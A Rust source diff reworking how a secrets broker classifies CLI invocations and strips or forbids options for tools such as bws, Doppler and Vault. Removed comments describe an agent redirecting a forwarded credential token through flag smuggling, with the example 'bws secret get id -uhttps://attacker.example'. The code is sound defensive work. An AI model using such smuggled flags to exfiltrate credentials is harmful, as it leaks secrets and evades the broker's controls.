@@ -1,440 +1,468 @@
 use super::{MatcherRule, MatchingResolution, NonEmptyVec, SecretMatcher};
 
-pub type CliMatcherRule = MatcherRule<ArgsAndMatcher, ArgsOnly>;
+/// A command-classification rule for a CLI secret provider.
+pub type CliMatcherRule = MatcherRule<CommandAndMatcher, CommandPattern>;
 
-/// One flag entry in a [`CliIntegrationSpec::strip_arg_flags`] /
-/// [`ArgsAndMatcher::strip_arg_flags`] list.
+/// A command-line option that a CLI integration needs to recognize.
 ///
-/// A bare string (`StripFlag::Named`) is shorthand for
-/// `StripFlag::Shaped(FlagShape { flag: <that string>, short: None, value:
-/// FlagValue::SeparateOrEquals })` — the crate's original, single-spelling,
-/// arity-blind heuristic (see [`FlagValue::SeparateOrEquals`]). Reach for
-/// `StripFlag::Shaped` (or the [`StripFlag::shaped`] constructor) instead
-/// when that default shape would get the flag wrong, e.g. to declare:
-/// * a second spelling for the same flag (e.g. `-u` for `--server-url`,
-///   `--tls-skip-verify` for `-tls-skip-verify`),
-/// * that the flag never takes a value at all ([`FlagValue::None`]), so the
-///   arity-blind heuristic must not swallow whatever positional happens to
-///   follow it (e.g. `vault kv get -tls-skip-verify secret/foo` must not
-///   lose `secret/foo`), or
-/// * that a value may be concatenated directly onto a short alias with no
-///   separator at all ([`FlagValue::Concatenated`], getopt-style, e.g.
-///   `-uVALUE`) — a form `SeparateOrEquals`'s exact-token/`flag=value`
-///   matching cannot recognize, letting an agent smuggle the value past an
-///   otherwise-correct stripped-flag list entirely (e.g. `bws secret get id
-///   -uhttps://attacker.example`).
+/// ```toml
+/// { name = "--format", takes_value = true }
+/// { name = "--offline", takes_value = false }
+/// { name = "-u", takes_value = true, allow_attached_value = true }
+/// ```
 #[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-#[serde(untagged)]
-pub enum StripFlag {
-    Named(String),
-    Shaped(FlagShape),
+#[serde(deny_unknown_fields)]
+pub struct FlagSpec {
+    /// The option's spelling, such as `--server-url` or `-u`.
+    pub name: String,
+    /// Whether the option consumes the following argument as its value.
+    pub takes_value: bool,
+    /// Whether the spelling accepts an attached value without `=`, such as
+    /// `-uhttps://example.com`.
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    pub allow_attached_value: bool,
 }
 
-impl StripFlag {
-    /// Builds a [`StripFlag::Shaped`] entry directly, without spelling out
-    /// [`FlagShape`] at each call site.
+impl FlagSpec {
+    /// Creates a specification for an option whose value is a separate
+    /// argument or follows `=`.
     #[must_use]
-    pub fn shaped(flag: &str, short: Option<&str>, value: FlagValue) -> Self {
-        Self::Shaped(FlagShape {
-            flag: String::from(flag),
-            short: short.map(String::from),
-            value,
-        })
-    }
-
-    /// The flag's primary spelling.
-    fn primary(&self) -> &str {
-        match self {
-            Self::Named(flag) => flag,
-            Self::Shaped(shape) => &shape.flag,
+    pub fn value(name: &str) -> Self {
+        Self {
+            name: String::from(name),
+            takes_value: true,
+            allow_attached_value: false,
         }
     }
 
-    /// The flag's additional spelling, if any.
-    fn short(&self) -> Option<&str> {
-        match self {
-            Self::Named(_) => None,
-            Self::Shaped(shape) => shape.short.as_deref(),
+    /// Creates a specification for an option that takes no value.
+    #[must_use]
+    pub fn valueless(name: &str) -> Self {
+        Self {
+            name: String::from(name),
+            takes_value: false,
+            allow_attached_value: false,
         }
     }
 
-    /// How this flag's value, if it has one, is attached to it.
-    fn value(&self) -> FlagValue {
-        match self {
-            Self::Named(_) => FlagValue::SeparateOrEquals,
-            Self::Shaped(shape) => shape.value,
+    /// Creates a specification for an option that also accepts a value
+    /// attached directly to its name.
+    #[must_use]
+    pub fn attached_value(name: &str) -> Self {
+        Self {
+            name: String::from(name),
+            takes_value: true,
+            allow_attached_value: true,
         }
     }
 }
 
-impl From<&str> for StripFlag {
-    fn from(flag: &str) -> Self {
-        Self::Named(String::from(flag))
-    }
-}
-
-/// The explicit form of [`StripFlag`]: every spelling this flag can appear
-/// as on the command line, and how its value (if any) attaches to it.
-#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-pub struct FlagShape {
-    /// The flag's primary spelling, exactly as it appears on the command
-    /// line (e.g. `"--server-url"`, `"-address"`).
-    pub flag: String,
-    /// An additional spelling for the same flag (e.g. `"-u"` for
-    /// `"--server-url"`), matched with the same `value` shape as `flag`,
-    /// except that only `short` is ever eligible for
-    /// [`FlagValue::Concatenated`] matching — see that variant's docs.
-    #[serde(default)]
-    pub short: Option<String>,
-    /// How this flag's value (if any) is attached to it on the command line.
-    #[serde(default)]
-    pub value: FlagValue,
-}
-
-/// How a [`StripFlag`]'s value, if it has one, is attached to it on the
-/// command line.
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Serialize, serde::Deserialize)]
+/// Whether a command pattern permits trailing positional arguments.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
 #[serde(rename_all = "snake_case")]
-pub enum FlagValue {
-    /// The flag never takes a value: only the bare flag token itself (or
-    /// `flag=value`, since e.g. Go's `flag` package accepts `-boolflag=true`
-    /// for booleans) is ever stripped — nothing after it is consumed.
-    None,
-    /// The historical default: a value follows as its own token (`--flag
-    /// value`) or is joined with `=` (`--flag=value`). Since this crate
-    /// can't otherwise know whether an unlisted flag truly takes a value, an
-    /// unrelated positional immediately following an exact-token match is
-    /// still swallowed as if it were that value — see
-    /// [`CliIntegrationSpec::rewrite_args`] for why that's accepted.
+pub enum CommandMatch {
+    /// Only the listed command words may occur. Options may be interspersed.
+    Exact,
+    /// Additional positional arguments may follow the listed command words.
     #[default]
-    SeparateOrEquals,
-    /// Like `SeparateOrEquals`, but a `short` alias's value may also be
-    /// concatenated directly onto it with no separator at all (getopt-style
-    /// short options, e.g. `-uVALUE`) — a form `SeparateOrEquals` cannot
-    /// recognize (its match is exact-token or `flag=`-prefixed only).
-    ///
-    /// Deliberately never applied to a [`StripFlag`]'s primary `flag`
-    /// spelling, only to `short`: prefix-matching a token against an
-    /// arbitrary flag name can otherwise swallow an unrelated flag that
-    /// merely shares that prefix (e.g. a hypothetical `--server-url-timeout`
-    /// next to a `Concatenated` `--server-url`) — a risk real getopt/clap
-    /// parsers avoid by resolving against a known flag registry, which this
-    /// crate doesn't have. That collision is far less likely for a short,
-    /// single-token alias, so only enable this for a spelling actually
-    /// documented to support concatenation.
-    Concatenated,
+    Prefix,
 }
 
-/// Per-CLI-tool behavior spec: credentials to forward, command
-/// classification, output normalization, and secret extraction from stdout.
+/// Deserializable configuration for a CLI secret-provider integration.
+///
+/// Convert this plain representation into [`CliIntegrationSpec`] to validate
+/// relationships between its option policies before use.
 #[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-pub struct CliIntegrationSpec {
-    /// Binary basename (e.g. `"bws"`).
+#[serde(deny_unknown_fields)]
+pub struct CliIntegrationConfig {
+    /// Executable basename used to select this integration.
     pub binary_name: String,
-    /// Stable integration identity (e.g. `"bitwarden"` for the `bws` binary) —
-    /// distinct from `binary_name`, which is the per-invocation executable.
+    /// Stable identifier recorded for secrets from this integration.
     pub provider_id: String,
-    /// Names of env vars that carry vault credentials. The broker forwards any
-    /// that are present in its own environment to the subprocess.
+    /// Environment variables forwarded to authenticate the provider CLI.
     pub credential_env_vars: Vec<String>,
-    /// Arg flags stripped from every resolved invocation, regardless of which
-    /// rule matched — unlike [`ArgsAndMatcher::strip_arg_flags`], which only
-    /// applies when its own `SensitiveCommand` rule is selected, these apply
-    /// to `SensitiveCommand` and `SafeCommand` resolutions alike (see
-    /// [`Self::rewrite_args`]). Meant for flags that let the invocation
-    /// redirect the CLI at a different backend or bypass TLS verification
-    /// (e.g. Doppler's `--api-host`/`--no-verify-tls`, Vault's
-    /// `-address`/`-tls-skip-verify`) — an agent could otherwise use one of
-    /// these on an *otherwise-permitted* command to make the subprocess send
-    /// the forwarded `credential_env_vars` token to a host of its choosing,
-    /// regardless of how well-redacted that command's own stdout is. See
-    /// [`StripFlag`] for how to shape an entry beyond a bare flag name.
+    /// Options ignored while identifying command words. Their value arity is
+    /// honored, and the options remain unchanged in the executed command.
     #[serde(default)]
-    pub strip_arg_flags: Vec<StripFlag>,
-    /// Candidate rules, tried against the invocation's args via
-    /// [`CliIntegrationSpec::resolve_args`]. A single binary can emit
-    /// different output shapes for different subcommands (e.g. `bws secret
-    /// list` returns an array of records, `bws secret get` returns a single
-    /// record), so the rule to apply is resolved per invocation rather than
-    /// fixed per binary. An invocation whose args match no rule here is
-    /// [`MatchingResolution::Blocked`] — fail closed, since an unrecognized
-    /// invocation shape may emit secret material this registry has no way to
-    /// extract or redact.
+    pub stripped_options: Vec<FlagSpec>,
+    /// Options that make an otherwise permitted invocation unsafe. An
+    /// invocation containing one is blocked rather than silently changed.
+    #[serde(default)]
+    pub forbidden_options: Vec<FlagSpec>,
+    /// Rules that classify invocations and configure secret extraction.
     pub matchers: Vec<CliMatcherRule>,
 }
 
+/// A CLI integration configuration that has passed cross-field validation.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct CliIntegrationSpec {
+    pub(crate) binary_name: String,
+    pub(crate) provider_id: String,
+    pub(crate) credential_env_vars: Vec<String>,
+    pub(crate) stripped_options: Vec<FlagSpec>,
+    pub(crate) forbidden_options: Vec<FlagSpec>,
+    pub(crate) matchers: Vec<CliMatcherRule>,
+}
+
+/// Error returned when validating a [`CliIntegrationConfig`].
+#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
+pub enum CliIntegrationConfigError {
+    /// An option has no spelling.
+    #[error("option name must not be empty")]
+    EmptyOptionName,
+    /// An option permits an attached value but does not take a value.
+    #[error("option `{name}` sets allow_attached_value but does not take a value")]
+    AttachedValueWithoutValue {
+        /// Invalid option spelling.
+        name: String,
+    },
+    /// One option spelling has different arity or attachment behavior across
+    /// integration and command scopes.
+    #[error(
+        "option `{name}` has conflicting definitions in integration-level and command-level stripped_options"
+    )]
+    ConflictingStrippedOption {
+        /// Conflicting option spelling.
+        name: String,
+    },
+}
+
+impl TryFrom<CliIntegrationConfig> for CliIntegrationSpec {
+    type Error = CliIntegrationConfigError;
+
+    fn try_from(config: CliIntegrationConfig) -> Result<Self, Self::Error> {
+        let command_options = config
+            .matchers
+            .iter()
+            .filter_map(|matcher| match matcher {
+                MatcherRule::SensitiveCommand(rule) => Some(rule),
+                MatcherRule::SafeCommand(_) | MatcherRule::BlockedCommand(_) => None,
+            })
+            .flat_map(|rule| &rule.stripped_options);
+        for option in config
+            .stripped_options
+            .iter()
+            .chain(&config.forbidden_options)
+            .chain(command_options)
+        {
+            if option.name.is_empty() {
+                return Err(CliIntegrationConfigError::EmptyOptionName);
+            }
+            if !option.takes_value && option.allow_attached_value {
+                return Err(CliIntegrationConfigError::AttachedValueWithoutValue {
+                    name: option.name.clone(),
+                });
+            }
+        }
+
+        for rule in config.matchers.iter().filter_map(|matcher| match matcher {
+            MatcherRule::SensitiveCommand(rule) => Some(rule),
+            MatcherRule::SafeCommand(_) | MatcherRule::BlockedCommand(_) => None,
+        }) {
+            for integration_option in &config.stripped_options {
+                if rule
+                    .stripped_options
+                    .iter()
+                    .filter(|option| option.name == integration_option.name)
+                    .any(|command_option| command_option != integration_option)
+                {
+                    return Err(CliIntegrationConfigError::ConflictingStrippedOption {
+                        name: integration_option.name.clone(),
+                    });
+                }
+            }
+        }
+
+        Ok(Self {
+            binary_name: config.binary_name,
+            provider_id: config.provider_id,
+            credential_env_vars: config.credential_env_vars,
+            stripped_options: config.stripped_options,
+            forbidden_options: config.forbidden_options,
+            matchers: config.matchers,
+        })
+    }
+}
+
 impl CliIntegrationSpec {
-    /// Resolves how the broker should handle an invocation with the given
-    /// args: apply a matcher, forward stdout unredacted as a known-safe
-    /// pass-through, or block the invocation outright.
-    ///
-    /// Follows a specific order:
-    /// * first blocked commands, that should be forbidden no matter what
-    /// * second sensitive commands, to apply secret redaction
-    /// * third safe commands, to let through without redaction
-    ///
-    /// Any command not falling in any of those rules will be blocked as an
-    /// extra safety measure.
-    ///
-    /// A rule's `args_match` doesn't have to be a literal argv prefix: see
-    /// [`args_matches`] for how flags interspersed before, between, or after
-    /// the matched tokens (e.g. a global flag placed ahead of the
-    /// subcommand) are tolerated.
+    /// Returns the executable basename used to select this integration.
+    #[must_use]
+    pub fn binary_name(&self) -> &str {
+        &self.binary_name
+    }
+
+    /// Returns the stable provider identifier recorded for extracted secrets.
+    #[must_use]
+    pub fn provider_id(&self) -> &str {
+        &self.provider_id
+    }
+
+    /// Returns the environment variables forwarded to authenticate the CLI.
+    #[must_use]
+    pub fn credential_env_vars(&self) -> &[String] {
+        &self.credential_env_vars
+    }
+
+    /// Classifies an invocation as sensitive, safe to pass through, or
+    /// blocked. Malformed recognized options fail closed.
     #[must_use]
     pub fn resolve_args(&self, args: &[String]) -> MatchingResolution<'_> {
-        // blocked commands
+        if contains_any_option(args, &self.forbidden_options) {
+            return MatchingResolution::Blocked;
+        }
+
         if self
             .matchers
             .iter()
             .filter_map(MatcherRule::as_blocked_command)
-            .any(|rule| args_matches(args, &rule.args_match))
+            .any(|rule| {
+                rule.match_args(args, &self.stripped_options, &[])
+                    != CommandMatchResult::DoesNotMatch
+            })
         {
             return MatchingResolution::Blocked;
         }
 
-        // sensitive commands
-        if let Some(rule) = self
+        for rule in self
             .matchers
             .iter()
             .filter_map(MatcherRule::as_sensitive_command)
-            .find(|rule| args_matches(args, &rule.args_match))
         {
-            return MatchingResolution::Matcher(&rule.matcher);
+            match rule
+                .command
+                .match_args(args, &self.stripped_options, &rule.stripped_options)
+            {
+                CommandMatchResult::Matches => {
+                    return MatchingResolution::Matcher(&rule.matcher);
+                }
+                CommandMatchResult::Malformed => return MatchingResolution::Blocked,
+                CommandMatchResult::DoesNotMatch => {}
+            }
         }
 
-        // safe commands
-        if self
+        for rule in self
             .matchers
             .iter()
             .filter_map(MatcherRule::as_safe_command)
-            .any(|rule| args_matches(args, &rule.args_match))
         {
-            return MatchingResolution::PassThrough;
+            match rule.match_args(args, &self.stripped_options, &[]) {
+                CommandMatchResult::Matches => return MatchingResolution::PassThrough,
+                CommandMatchResult::Malformed => return MatchingResolution::Blocked,
+                CommandMatchResult::DoesNotMatch => {}
+            }
         }
 
         MatchingResolution::Blocked
     }
 
-    /// Rewrites the shim-requested args for the actual subprocess
-    /// invocation, for whichever rule [`Self::resolve_args`] would select for
-    /// `args`.
-    ///
-    /// For a `SensitiveCommand` match: strips [`Self::strip_arg_flags`]
-    /// and the rule's own `strip_arg_flags` entries, then appends its
-    /// `forced_args`. Different sensitive commands on the same binary can
-    /// require different forced output shapes (e.g. `doppler secrets
-    /// download` forces `--format json --no-file`, while bare `doppler
-    /// secrets` forces `--json` and strips `--raw`), so those live on the
-    /// rule rather than the spec.
-    ///
-    /// For a `SafeCommand` match: strips [`Self::strip_arg_flags`]
-    /// only — a pass-through command has no `forced_args`/`strip_arg_flags`
-    /// of its own, but still must not let a backend-override or
-    /// TLS-bypass flag through unstripped just because its own output needs
-    /// no redaction.
-    ///
-    /// Returns `args` unchanged if no `SensitiveCommand` or `SafeCommand`
-    /// rule matches — there's nothing to rewrite for a blocked invocation,
-    /// since it's never executed.
-    ///
-    /// How a stripped flag's trailing token is (or isn't) treated as its
-    /// value is governed by that [`StripFlag`]'s [`FlagValue`] shape — see
-    /// [`strip_flags_from_args`] and [`FlagValue`]'s variants for the exact
-    /// rules, including the arity-blind default's known limitation.
+    /// Normalizes a sensitive command's output options. Forbidden options are
+    /// handled by [`Self::resolve_args`] and are never silently removed.
     #[must_use]
     pub fn rewrite_args(&self, args: &[String]) -> Vec<String> {
-        if let Some(rule) = self
+        let Some(rule) = self
             .matchers
             .iter()
             .filter_map(MatcherRule::as_sensitive_command)
-            .find(|rule| args_matches(args, &rule.args_match))
-        {
-            let mut strip_flags = self.strip_arg_flags.clone();
-            strip_flags.extend(rule.strip_arg_flags.iter().cloned());
-            let mut rewritten = strip_flags_from_args(args, &strip_flags, &rule.args_match);
-            rewritten.extend(rule.forced_args.iter().cloned());
-            return rewritten;
-        }
+            .find(|rule| {
+                rule.command
+                    .match_args(args, &self.stripped_options, &rule.stripped_options)
+                    == CommandMatchResult::Matches
+            })
+        else {
+            return args.to_vec();
+        };
 
-        if let Some(rule) = self
-            .matchers
+        let mut rewritten = remove_options(args, &rule.stripped_options);
+        let insertion_index = rewritten
             .iter()
-            .filter_map(MatcherRule::as_safe_command)
-            .find(|rule| args_matches(args, &rule.args_match))
-        {
-            return strip_flags_from_args(args, &self.strip_arg_flags, &rule.args_match);
+            .position(|arg| arg == "--")
+            .unwrap_or(rewritten.len());
+        rewritten.splice(
+            insertion_index..insertion_index,
+            rule.append_options.iter().cloned(),
+        );
+        rewritten
+    }
+}
+
+/// A sensitive command pattern together with its extraction and output
+/// normalization policy.
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct CommandAndMatcher {
+    /// Pattern used to identify the command.
+    #[serde(flatten)]
+    pub command: CommandPattern,
+    /// Matcher used to extract secrets from the normalized output.
+    pub matcher: SecretMatcher,
+    /// Output-shaping options skipped during matching and removed before
+    /// [`Self::append_options`] is applied.
+    #[serde(default)]
+    pub stripped_options: Vec<FlagSpec>,
+    /// Options and values added to normalize output into the expected form.
+    /// They are inserted before an end-of-options (`--`) marker when present.
+    #[serde(default)]
+    pub append_options: Vec<String>,
+}
+
+/// Command words and the rule for matching trailing positional arguments.
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct CommandPattern {
+    /// Command words, excluding the binary name.
+    pub argv: NonEmptyVec<String>,
+    /// Whether trailing positional arguments are accepted.
+    #[serde(rename = "match", default)]
+    pub match_kind: CommandMatch,
+}
+
+impl CommandPattern {
+    /// Creates a pattern that accepts trailing positional arguments.
+    #[must_use]
+    pub fn prefix(argv: NonEmptyVec<String>) -> Self {
+        Self {
+            argv,
+            match_kind: CommandMatch::Prefix,
         }
+    }
 
-        args.to_vec()
+    /// Creates a pattern that accepts only the listed command words.
+    #[must_use]
+    pub fn exact(argv: NonEmptyVec<String>) -> Self {
+        Self {
+            argv,
+            match_kind: CommandMatch::Exact,
+        }
+    }
+
+    fn match_args(
+        &self,
+        args: &[String],
+        integration_options: &[FlagSpec],
+        command_options: &[FlagSpec],
+    ) -> CommandMatchResult {
+        command_matches(
+            args,
+            &self.argv,
+            self.match_kind,
+            integration_options,
+            command_options,
+        )
     }
 }
 
-/// Whether/how a single arg token matched a [`StripFlag`].
-enum FlagTokenMatch {
-    /// The token's value (if any) is embedded in the token itself — either
-    /// `flag=value`, or, for a `short` alias shaped
-    /// [`FlagValue::Concatenated`], `flag` immediately followed by the value
-    /// with no separator at all (e.g. `-uVALUE`). Nothing else is consumed.
-    WholeToken,
-    /// The token is exactly one of the flag's spellings, with no value
-    /// embedded in it — the *next* token may still be consumed as this
-    /// flag's value, per [`strip_flags_from_args`]'s rules.
-    ExactSpelling,
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum CommandMatchResult {
+    Matches,
+    DoesNotMatch,
+    Malformed,
 }
 
-/// Matches `arg` against every spelling of `strip_flag`, returning how (if
-/// at all) it matched. See [`FlagTokenMatch`] and [`FlagValue`] for what each
-/// outcome means.
-fn match_flag_token(arg: &str, strip_flag: &StripFlag) -> Option<FlagTokenMatch> {
-    if let Some(matched) = match_spelling(arg, strip_flag.primary(), false) {
-        return Some(matched);
-    }
-    let short = strip_flag.short()?;
-    match_spelling(arg, short, strip_flag.value() == FlagValue::Concatenated)
+fn contains_any_option(args: &[String], options: &[FlagSpec]) -> bool {
+    args.iter()
+        .take_while(|arg| arg.as_str() != "--")
+        .any(|arg| options.iter().any(|option| match_option_token(arg, option)))
 }
 
-/// Matches a single spelling of a flag against `arg`. `allow_concatenated`
-/// additionally recognizes `spelling` immediately followed by a value with
-/// no separator (getopt-style, e.g. `-uVALUE`) — deliberately only ever
-/// passed `true` for a [`StripFlag`]'s `short` alias; see
-/// [`FlagValue::Concatenated`]'s docs for why the primary spelling never
-/// gets this treatment.
-fn match_spelling(arg: &str, spelling: &str, allow_concatenated: bool) -> Option<FlagTokenMatch> {
-    if arg == spelling {
-        return Some(FlagTokenMatch::ExactSpelling);
-    }
-    let rest = arg.strip_prefix(spelling)?;
-    if rest.starts_with('=') || (allow_concatenated && !rest.is_empty()) {
-        return Some(FlagTokenMatch::WholeToken);
-    }
-    None
+fn match_option_token(arg: &str, option: &FlagSpec) -> bool {
+    let name = &option.name;
+    arg == name
+        || arg
+            .strip_prefix(name)
+            .is_some_and(|rest| rest.starts_with('='))
+        || (option.allow_attached_value
+            && arg.strip_prefix(name).is_some_and(|rest| !rest.is_empty()))
 }
 
-/// Removes every occurrence of any flag in `flags_to_strip` from `args`, per
-/// each entry's [`StripFlag`] shape. `protected_tokens` (a matched rule's
-/// own `args_match`) is never consumed as a stripped flag's value — see
-/// [`CliIntegrationSpec::rewrite_args`] for why.
-///
-/// An `ExactSpelling` match's trailing token is only consumed as the flag's
-/// value when the flag's [`FlagValue`] isn't `None`, and even then only when
-/// that trailing token doesn't itself look like a flag (start with `-`) and
-/// isn't one of `protected_tokens` — a subcommand word that `resolve_args`
-/// relied on to select the very rule this stripping happens for, that
-/// happens to follow it. `FlagValue::SeparateOrEquals` (the shape a bare
-/// [`StripFlag::Named`] entry gets) carries no true arity awareness, though:
-/// a flag declared that way, immediately followed by a plain positional that
-/// is neither a flag nor a protected token, still has that positional
-/// swallowed as if it were the flag's value, even if the flag never actually
-/// takes one. Declare the flag as [`StripFlag::Shaped`] with
-/// `FlagValue::None` to opt out of that and preserve the following
-/// positional instead.
-fn strip_flags_from_args(
-    args: &[String],
-    flags_to_strip: &[StripFlag],
-    protected_tokens: &[String],
-) -> Vec<String> {
+fn remove_options(args: &[String], options: &[FlagSpec]) -> Vec<String> {
     let mut rewritten = Vec::with_capacity(args.len());
-    let mut iter = args.iter().peekable();
+    let mut iter = args.iter();
     while let Some(arg) = iter.next() {
-        let Some((strip_flag, matched)) = flags_to_strip
+        if arg == "--" {
+            rewritten.push(arg.clone());
+            rewritten.extend(iter.cloned());
+            break;
+        }
+
+        let Some(option) = options
             .iter()
-            .find_map(|flag| match_flag_token(arg, flag).map(|matched| (flag, matched)))
+            .find(|option| match_option_token(arg, option))
         else {
             rewritten.push(arg.clone());
             continue;
         };
 
-        if matches!(matched, FlagTokenMatch::ExactSpelling)
-            && strip_flag.value() != FlagValue::None
-            && iter
-                .peek()
-                .is_some_and(|next| !next.starts_with('-') && !protected_tokens.contains(next))
-        {
+        let has_embedded_value = arg.strip_prefix(&option.name).is_some_and(|rest| {
+            rest.starts_with('=') || (!rest.is_empty() && option.allow_attached_value)
+        });
+        if option.takes_value && !has_embedded_value {
             iter.next();
         }
     }
     rewritten
 }
 
-#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-pub struct ArgsAndMatcher {
-    /// Subcommand and positional args (e.g. `["secret", "get"]`) that an
-    /// invocation's args must contain, in order, to select this rule — see
-    /// [`args_matches`] for exactly how flags interspersed among them are
-    /// tolerated.
-    #[serde(default)]
-    pub args_match: Vec<String>,
-    /// How to extract `(name, value)` pairs from the tool's stdout.
-    pub matcher: SecretMatcher,
-    /// Arg flags to strip from the shim's requested args when this rule is
-    /// selected, before appending `forced_args`. See [`StripFlag`] for the
-    /// per-entry shape (bare name vs. explicit spellings/value form) and
-    /// [`CliIntegrationSpec::rewrite_args`] for exactly how a flag's
-    /// trailing value is recognized. Example: `vec![StripFlag::from("--format")]`.
-    #[serde(default)]
-    pub strip_arg_flags: Vec<StripFlag>,
-    /// Args appended to the subprocess command when this rule is selected,
-    /// after stripping. Used to force a specific output format that
-    /// `matcher` expects. Example: `vec!["--format", "json"]`.
-    #[serde(default)]
-    pub forced_args: Vec<String>,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-pub struct ArgsOnly {
-    /// Subcommand and positional args (e.g. `["secret", "get"]`) that an
-    /// invocation's args must contain, in order, to select this rule — see
-    /// [`args_matches`] for exactly how flags interspersed among them are
-    /// tolerated.
-    pub args_match: NonEmptyVec<String>,
-}
-
-/// Whether `args` contains every token of `matcher`, in the same order,
-/// tolerating arbitrary flags interspersed before, between, or after them
-/// (e.g. a global flag placed ahead of the subcommand, or a per-command flag
-/// placed between two subcommand tokens).
-///
-/// A token is treated as a flag if it starts with `-`. A `--flag value`
-/// pair (as opposed to the self-contained `--flag=value` form) may consume
-/// the immediately following token as its value and skip it too — but only
-/// when that token isn't itself required to continue matching `matcher` and
-/// doesn't look like a flag itself, so a bare boolean flag immediately
-/// followed by the next expected `matcher` token doesn't swallow it. A
-/// token that is neither a flag nor the next expected `matcher` token is an
-/// unexpected positional argument and fails the match — this is what keeps
-/// `["kv", "get"]` from matching `["kv", "list"]`.
-///
-/// An empty `matcher` matches any `args`, mirroring `[].starts_with(...)`.
-fn args_matches(args: &[String], matcher: &[String]) -> bool {
-    let mut args = args.iter();
-    let mut matcher = matcher.iter();
-    let Some(mut expected) = matcher.next() else {
-        return true;
-    };
-
-    while let Some(arg) = args.next() {
-        if arg == expected {
-            let Some(next) = matcher.next() else {
-                return true;
-            };
-            expected = next;
+fn command_matches(
+    args: &[String],
+    command: &[String],
+    match_kind: CommandMatch,
+    integration_options: &[FlagSpec],
+    command_options: &[FlagSpec],
+) -> CommandMatchResult {
+    let mut words = Vec::new();
+    let mut iter = args.iter();
+    let mut options_ended = false;
+    let mut malformed = false;
+    while let Some(arg) = iter.next() {
+        if !options_ended && arg == "--" {
+            options_ended = true;
             continue;
         }
 
-        if !arg.starts_with('-') {
-            return false;
-        }
-
-        if !arg.contains('=') {
-            let mut lookahead = args.clone();
-            if let Some(value) = lookahead.next()
-                && value != expected
-                && !value.starts_with('-')
-            {
-                args = lookahead;
+        if !options_ended
+            && let Some(option) = integration_options
+                .iter()
+                .chain(command_options)
+                .find(|option| match_option_token(arg, option))
+        {
+            let has_embedded_value = arg.strip_prefix(&option.name).is_some_and(|rest| {
+                rest.starts_with('=') || (!rest.is_empty() && option.allow_attached_value)
+            });
+            if option.takes_value && !has_embedded_value {
+                match iter.next() {
+                    Some(value) if value != "--" => {}
+                    Some(_) => {
+                        malformed = true;
+                        options_ended = true;
+                    }
+                    None => malformed = true,
+                }
             }
+        } else if !options_ended && arg.starts_with('-') {
+            // Unknown options are left to the CLI to reject, but cannot become
+            // command words for rule selection.
+        } else {
+            words.push(arg.as_str());
         }
     }
 
-    false
+    let matches = match match_kind {
+        CommandMatch::Exact => words.iter().copied().eq(command.iter().map(String::as_str)),
+        CommandMatch::Prefix => {
+            words
+                .iter()
+                .copied()
+                .zip(command.iter().map(String::as_str))
+                .all(|(actual, expected)| actual == expected)
+                && words.len() >= command.len()
+        }
+    };
+
+    if !matches {
+        CommandMatchResult::DoesNotMatch
+    } else if malformed {
+        CommandMatchResult::Malformed
+    } else {
+        CommandMatchResult::Matches
+    }
 }
